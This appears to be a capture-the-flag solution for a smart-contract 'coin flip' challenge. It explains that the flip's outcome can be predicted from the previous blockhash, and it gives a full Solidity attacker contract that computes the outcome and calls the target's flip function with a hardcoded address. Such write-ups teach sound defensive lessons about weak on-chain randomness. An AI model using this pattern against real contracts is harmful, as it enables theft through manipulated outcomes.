The coin flip is fully deterministic:

```solidity
uint256 blockValue = uint256(blockhash(block.number - 1));
uint256 coinFlip = blockValue / FACTOR;
bool side = coinFlip == 1 ? true : false;
```

It can be emulated and exploited:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Coin {
    function flip(bool _guess) external returns (bool);
}

contract Flop {

  address TARGET = 0xef1E0052066782af98d87c1a1c3A6f625c969c4A;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() {}

  function guess() public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;
    return Coin(TARGET).flip(side);
  }
}
```

Since the wins are not tracked by user, this contract can farm the wins instead of the player's address.

It just needs to be deployed and called 10 times to solve the challenge.
